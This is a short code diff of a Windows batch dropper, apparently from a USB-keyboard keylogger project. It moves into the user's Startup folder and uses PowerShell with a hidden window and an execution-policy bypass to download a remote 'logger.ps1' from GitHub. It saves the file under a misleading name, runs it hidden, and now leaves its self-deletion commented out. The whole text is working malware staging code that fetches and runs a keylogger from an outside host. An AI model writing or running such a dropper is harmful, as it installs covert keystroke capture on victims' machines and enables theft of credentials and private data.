@@ -9,7 +9,7 @@ set StartupDir=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
 cd %StartupDir%
 
 @rem Download payload
-powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Duckey-Logger-Retried/refs/heads/main/logger.ps1' -outfile '.\wget.cmd'"
+powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Duckey-Logger-Retried/refs/heads/main/logger.ps1' -outfile '.\wget.cmd'"
 
 @rem run the payload
 powershell -noprofile start-process powershell.exe -windowstyle hidden ".\wget.cmd"
@@ -17,7 +17,7 @@ powershell -noprofile start-process powershell.exe -windowstyle hidden ".\wget.c
 @rem move back to saved directory
 cd %InitialPath%
 
-del initial.cmd
+@REM del initial.cmd
 
 @REM (
 @REM     echo @echo off
